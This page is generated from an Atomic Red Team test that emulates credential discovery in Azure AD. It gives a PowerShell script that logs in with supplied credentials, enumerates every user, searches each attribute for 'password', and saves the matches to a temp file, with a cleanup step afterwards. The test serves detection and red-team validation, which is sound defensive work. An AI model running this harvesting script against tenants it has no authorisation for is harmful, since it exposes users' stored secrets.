---
atomic_guid: "ae9b2e3e-efa1-4483-86e2-fae529ab9fb6"
title: "Azure - Search Azure AD User Attributes for Passwords"
framework: "atomic"
generated: "true"
attack_technique_id: "T1552.005"
attack_technique_name: "Unsecured Credentials: Cloud Instance Metadata API"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.005/T1552.005.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "ae9b2e3e-efa1-4483-86e2-fae529ab9fb6"
  - "Azure - Search Azure AD User Attributes for Passwords"
platforms:
  - "azure-ad"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Azure - Search Azure AD User Attributes for Passwords

This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. 
Upon successful execution, this test will scan all user attributes for any strings containing "password".
Those unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. 
See: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md

## Metadata

- Atomic GUID: ae9b2e3e-efa1-4483-86e2-fae529ab9fb6
- Technique: T1552.005: Unsecured Credentials: Cloud Instance Metadata API
- Platforms: azure-ad
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1552.005/T1552.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1552-unsecured_credentials|T1552.005]]

## Input Arguments

### password

- description: Azure AD password
- type: string
- default: T1082Az

### username

- description: Azure AD username
- type: string

## Dependencies

The MSOnline module must be installed.

### Prerequisite Check

```text
if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}
```

### Get Prerequisite

```text
install-module MSOnline
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
import-module msonline
$Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
Connect-MsolService -Credential $Credential
$users = Get-MsolUser -All;
foreach($user in $users)
{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; 
foreach($prop in $props)
{if($user.$prop -like "*password*")
{("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}
get-content -path $env:temp\T1552.005Test1.txt -erroraction silentlycontinue
```

### Cleanup

```powershell
remove-item $env:temp\T1552.005Test1.txt -force -erroraction silentlycontinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.005/T1552.005.yaml)
